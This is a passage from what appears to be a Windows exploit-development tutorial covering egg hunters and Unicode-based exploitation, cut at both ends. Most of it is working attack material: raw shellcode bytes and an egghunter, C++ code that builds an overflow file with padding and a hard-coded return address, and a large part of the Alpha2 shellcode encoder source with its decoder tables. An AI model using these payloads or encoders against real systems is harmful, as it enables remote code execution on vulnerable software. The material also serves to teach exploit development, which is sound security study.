<br>&quot;\xb8\xd7\x13\x93\x1c\xda\xc3\xd9\x74\x24\xf4\x5a\x31\xc9&quot;<br>&quot;\xb1\x39\x31\x42\x12\x03\x42\x12\x83\x15\x17\x71\xe9\x65&quot;<br>&quot;\xf0\xfa\x12\x95\x01\x65\x9a\x70\x30\xb7\xf8\xf1\x61\x07&quot;<br>&quot;\x8a\x57\x8a\xec\xde\x43\x9d\x45\x94\x4d\x2a\xdb\x01\xa0&quot;<br>&quot;\xd3\x2d\x92\x6e\x17\x2f\x6e\x6c\x44\x8f\x4f\xbf\x99\xce&quot;<br>&quot;\x88\x76\xd7\x3f\x44\xdf\x9c\x92\x79\x54\xe0\x2e\x7b\xba&quot;<br>&quot;\x6e\x0e\x03\xbf\xb1\xfb\xbf\xbe\xe1\x8f\x08\xd8\x8a\xc8&quot;<br>&quot;\xa8\xd9\x5f\xb8\x2d\x10\x2b\x05\x67\x93\x2b\xfe\x43\x58&quot;<br>&quot;\xd2\xd7\x9d\x9e\x79\x16\x12\x13\x83\x5e\x95\xcb\xf6\x94&quot;<br>&quot;\xe5\x76\x01\x6f\x97\xac\x84\x70\x3f\x27\x3e\x55\xc1\xe4&quot;<br>&quot;\xd9\x1e\xcd\x41\xad\x79\xd2\x54\x62\xf2\xee\xdd\x85\xd5&quot;<br>&quot;\x66\xa5\xa1\xf1\x23\x7e\xcb\xa0\x89\xd1\xf4\xb3\x76\x8e&quot;<br>&quot;\x50\xbf\x95\xd9\xe5\x40\x66\xe6\xbb\x56\x92\x18\x44\xa7&quot;<br>&quot;\xd0\x6b\x21\xd5\x29\xb9\x87\x7d\x22\xd1\xd7\x15\xf6\x5e&quot;<br>&quot;\xfe\xe2\xf9\x75\x94\xec\xed\x7c\x69\xed\xed\x3c\x26\xab&quot;<br>&quot;\xcd\x94\xdd\x40\x7a\x14\xf6\xab\x82\x14\x06\xfc\xe7\x78&quot;<br>&quot;\x6a\x93\xc7\xf7\x1d\x19\x64\x93\xe1\xb7\x74\x33\xa7\xc4&quot;<br>&quot;\x23\xc4\xd8\x1e\xa1\xca\x4e\x51\x83\x68\xd8\x6e\x39&quot;;<br><br>char huntercode[] =<br>&quot;\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8&quot;<br>&quot;R0CK&quot;<br>&quot;\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7&quot;;<br><br>int main() &#123;<br>	size_t const RET_OFFSET = 84;<br>	ofstream fout(OUTPUT_FILE.c_str());<br>	<br>	string egg(eggcode);<br>	string padding(RET_OFFSET, &#x27;A&#x27;);<br>	string ret(&quot;\x13\x4f\x87\x7c&quot;); //7C874F13<br>	string hunter(huntercode);<br>	<br>	fout &lt;&lt; &quot;R0CKR0CK&quot; &lt;&lt; egg &lt;&lt; &#x27;\n&#x27;<br>		 &lt;&lt; padding &lt;&lt; ret &lt;&lt; hunter;<br>		 <br>	cout &lt;&lt; &quot;OK: &quot; &lt;&lt; OUTPUT_FILE &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<h3 id="Egg-Hunt-Practice——Kolibri-Web-Server"><a href="#Egg-Hunt-Practice——Kolibri-Web-Server" class="headerlink" title="Egg Hunt Practice——Kolibri Web Server"></a>Egg Hunt Practice——Kolibri Web Server</h3><h2 id="5-3-–-Unicode-Based-Exploitation-Techniques"><a href="#5-3-–-Unicode-Based-Exploitation-Techniques" class="headerlink" title="5.3 – Unicode-Based Exploitation Techniques"></a>5.3 – Unicode-Based Exploitation Techniques</h2><h3 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h3><p><code>A</code> = <code>\x41</code> in ASCII representation<br><code>A</code> = <code>\x00\x41</code> in Unicode (UTF-16LE) representation, where <code>\x00</code> is the null byte.</p>
<p>When converting from ASCII to Unicode, values from <code>\x00</code> to <code>\x7F</code> remain unchanged, except that they are prefixed with <code>\x00</code>.<br>On the other hand, values from <code>\x80</code> to <code>\xFF</code> may be converted differently depending on the code page.</p>
<p>Consequently, only values from <code>\x00</code> to <code>\x7F</code> are suitable for buffer overflow exploitation, since these values remain consistent across different Windows systems, even when different language settings are used.<br>In contrast, values from <code>\x80</code> to <code>\xFF</code> are unpredictable.</p>
<p>We can use <strong>Alpha 2 (Berend-Jan Wever)</strong> to solve these problem:<br><a target="_blank" rel="noopener" href="https://github.com/un4ckn0wl3z/Alpha2-encoder">Alpha 2</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//Author: Berend-Jan Wever<br>#include &lt;stdio.h&gt; // printf(), fprintf(), stderr<br>#include &lt;stdlib.h&gt; // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()<br>#include &lt;string.h&gt; // strcasecmp(), strstr()<br>#include &lt;sys/time.h&gt; //struct timeval, struct timezone, gettimeofday()<br><br>#define VERSION_STRING &quot;ALPHA 2: Zero-tolerance. (build 07)&quot;<br>#define COPYRIGHT      &quot;Copyright (C) 2003, 2004 by Berend-Jan Wever.&quot;<br>/*<br>________________________________________________________________________________<br><br>    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance.<br>   SS&quot;  Y$P&quot;  SY&quot;  ,SY<br>  iS&#x27;   dY       ,sS&quot;   Unicode-proof uppercase alphanumeric shellcode encoding.<br>  YS,  dSb    ,sY&quot;      Copyright (C) 2003, 2004 by Berend-Jan Wever.<br>  `&quot;YSS&#x27;&quot;S&#x27; &#x27;SSSSSSSP   &lt;skylined@edup.tudelft.nl&gt;<br>________________________________________________________________________________<br><br>  This program is free software; you can redistribute it and/or modify it under<br>  the terms of the GNU General Public License version 2, 1991 as published by<br>  the Free Software Foundation.<br><br>  This program is distributed in the hope that it will be useful, but WITHOUT<br>  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS<br>  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more<br>  details.<br><br>  A copy of the GNU General Public License can be found at:<br>    http://www.gnu.org/licenses/gpl.html<br>  or you can write to:<br>    Free Software Foundation, Inc.<br>    59 Temple Place - Suite 330<br>    Boston, MA  02111-1307<br>    USA.<br><br>Acknowledgements:<br>  Thanks to rix for his phrack article on aphanumeric shellcode.<br>  Thanks to obscou for his phrack article on unicode-proof shellcode.<br>  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.<br>  Thanks to spoonm for inspiration and suggestions, check out his 1337 perl<br>            conversion of ALPHA in the metasploit framework (with polymorphism!)<br>*/<br><br>#define mixedcase_w32sehgetpc           &quot;VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36&quot; \<br>                                        &quot;FFFFTXVj0PPTUPPa301089&quot;<br>#define uppercase_w32sehgetpc           &quot;VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYY&quot; \<br>                                        &quot;P5YYYD5KKYAPTTX638TDDNVDDX4Z4A638618&quot; \<br>                                        &quot;16&quot;<br>#define mixedcase_ascii_decoder_body    &quot;jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;<br>#define uppercase_ascii_decoder_body    &quot;VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0B&quot; \<br>                                        &quot;BXP8ACJJI&quot;<br>#define mixedcase_unicode_decoder_body  &quot;jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIA&quot; \<br>                                        &quot;IAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA&quot; \<br>                                        &quot;ZBABABABABkMAGB9u4JB&quot;<br>#define uppercase_unicode_decoder_body  &quot;QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5&quot; \<br>                                        &quot;AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB&quot; \<br>                                        &quot;QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB3&quot; \<br>                                        &quot;0APB944JB&quot;<br><br>struct decoder &#123;<br>  char* id; // id of option<br>  char* code; // the decoder<br>&#125; mixedcase_ascii_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;IIIIIIIIIIIIIIIIII7&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;IIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;JJJJJJJJJJJJJJJJJ7RY&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLYIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLYIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-8]&quot;,  &quot;LLLLLLLLYIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-4]&quot;,  &quot;LLLLYIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;YIIIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+8]&quot;,  &quot;YYYIIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+C]&quot;,  &quot;YYYYIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+10]&quot;, &quot;YYYYYIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+14]&quot;, &quot;YYYYYYIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYYIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;seh&quot;,      mixedcase_w32sehgetpc &quot;IIIIIIIIIIIIIIIII7QZ&quot; // ecx code<br>                mixedcase_ascii_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;, uppercase_ascii_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;IIIIIIIIIIII&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;IIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;JJJJJJJJJJJRY&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLYII7QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLYIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-8]&quot;,  &quot;LLLLLLLLYIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-4]&quot;,  &quot;LLLL7YIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;YIIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+8]&quot;,  &quot;YYYIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+C]&quot;,  &quot;YYYYIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+10]&quot;, &quot;YYYYYIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+14]&quot;, &quot;YYYYYYIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYYIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;seh&quot;,      uppercase_w32sehgetpc &quot;IIIIIIIIIIIQZ&quot; // ecx code<br>                uppercase_ascii_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;, mixedcase_ascii_nocompress_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;7777777777777777777777777777777777777&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;77777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;77777777777777777777777777777777777RY&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLY777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLY7777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-8]&quot;,  &quot;LLLLLLLLY77777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-4]&quot;,  &quot;LLLL7Y77777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;Y7777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+8]&quot;,  &quot;YYY77777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+C]&quot;,  &quot;YYYY7777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+10]&quot;, &quot;YYYYY777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+14]&quot;, &quot;YYYYYY77777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYY7777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYY777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,<br>  &#123; &quot;seh&quot;,      mixedcase_w32sehgetpc &quot;77777777777777777777777777777777777QZ&quot; // ecx code<br>                mixedcase_ascii_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;, uppercase_ascii_nocompress_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;777777777777777777777777&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;7777777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;7777777777777777777777RY&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLY77777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLY777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-8]&quot;,  &quot;LLLLLLLLY7777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp-4]&quot;,  &quot;LLLL7Y7777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;Y777777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+8]&quot;,  &quot;YYY7777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+C]&quot;,  &quot;YYYY777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+10]&quot;, &quot;YYYYY77777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+14]&quot;, &quot;YYYYYY7777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYY777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYY77777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,<br>  &#123; &quot;seh&quot;,      uppercase_w32sehgetpc &quot;7777777777777777777777QZ&quot; // ecx code<br>                uppercase_ascii_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;, mixedcase_unicode_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; 